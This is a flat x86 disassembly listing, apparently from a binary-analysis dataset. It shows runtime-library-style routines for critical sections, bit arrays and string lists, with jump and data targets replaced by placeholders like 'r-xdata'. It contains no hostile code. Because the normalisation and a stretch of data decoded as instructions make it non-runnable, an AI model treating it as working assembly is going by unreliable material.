mov eax [ ebp - 0x4 ]
call sub_41a978
xor eax eax
push ebp
push sub_41a8d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403254
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403244
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8dd
mov eax [ ebp - 0x4 ]
call sub_41a9dc
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41a8f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a978
xor eax eax
push ebp
push sub_41a96c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a474
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a62c
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a973
mov eax [ ebp - 0x4 ]
call sub_41a9dc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41a55c
sub_41a98c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a978
xor eax eax
push ebp
push sub_41a9cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a714
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9d6
mov eax [ ebp - 0x4 ]
call sub_41a9dc
retn
sub_41a9e8
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41aa3c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41aa18
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4027c4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c68
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4027e4
mov edx edi
mov eax ebp
call sub_41aa30
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4029c0
sub_41aae0
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41aa18
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41aa3c
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_41ab24
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_41ab9c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_41d294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41abdc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ac92
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40403c
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404208
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031a4
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac99
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41acb8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ad4d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031a4
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404208
mov eax ebx
mov si 0xffff
call sub_403450
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad54
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
mov si 0xffff
call sub_403450
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403450
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404324
sub_41ad5f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034a8
mov eax ebx
mov si 0xffff
call sub_403450
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403450
push eax
lea eax [ ebx + 0x4 ]
call sub_405a08
mov ecx eax
mov edx r-xdata
pop eax
call sub_403308
sub_41adbc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41addc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41adfc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41ae24
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41ae44
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41ae9e
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_41a6b8
call sub_403254
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41aeac
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ba04
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41aedc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41af00
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41af24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41afcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_41afae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41afb5
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41afdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41abc8
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_41b05c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
sub_41b08c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41b144
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41b0e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41b89c
mov eax [ ebp - 0x8 ]
push eax
push sub_41bb4c
push ebp
call sub_41b08c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b144
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b1d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1e0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc8
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4043b0
jne r-xdata
sub_41b1f0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41b1ec
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
jmp sub_4039e0
sub_41b228
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b270
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405ecc
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41b1f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b277
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41b280
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b358
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_41b336
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b33d
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
sub_41b374
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41b3b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404464
call sub_408e00
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3c0
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41b3c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b4d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_40403c
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404094
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4da
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc8
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404264
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404264
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404264
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4029c0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4029c0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404264
mov ebx eax
test ebx ebx
je r-xdata
sub_41b4f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b568
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b56f
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41b57c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b63f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4044c4
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41bbdc
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40418c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c94c
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b646
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_41b650
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41b684
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41b6b4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c718
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b6fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b703
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_41b708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b7a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_41b788
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41c264
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404094
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b78f
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
sub_41b7b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b855
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b85c
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_41b838
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
sub_41b864
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41b89c
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b940
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41e454
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_41b91b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d4f0
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41f0f4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b922
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
sub_41b94c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c718
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b997
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b99e
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_41b9a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b9f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41c4c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9f8
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41ba04
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
